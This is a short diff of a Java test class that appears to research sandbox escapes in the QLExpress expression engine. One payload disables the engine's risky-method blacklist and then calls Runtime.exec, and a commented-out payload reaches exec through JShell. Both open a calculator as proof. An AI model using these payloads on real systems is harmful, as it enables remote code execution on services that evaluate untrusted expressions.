@@ -34,8 +34,8 @@ public class Test1 {
 //        String payload2 = "jdk.jshell.JShell.create().eval('java.lang.Runtime.getRuntime().exec(\"open -a calculator.app\")')";
 
 //        利用QLExpressRunStrategy关闭黑名单
-        String code = "import com.ql.util.express.config.QLExpressRunStrategy;QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(false);Runtime.getRuntime().exec(\"open -a calculator.app\");";
-        runner.execute(code, new DefaultContext<>(), null, false, true);
+        String payload3 = "import com.ql.util.express.config.QLExpressRunStrategy;QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(false);Runtime.getRuntime().exec(\"open -a calculator.app\");";
+        runner.execute(payload3, new DefaultContext<>(), null, false, true);
     }
 }
 
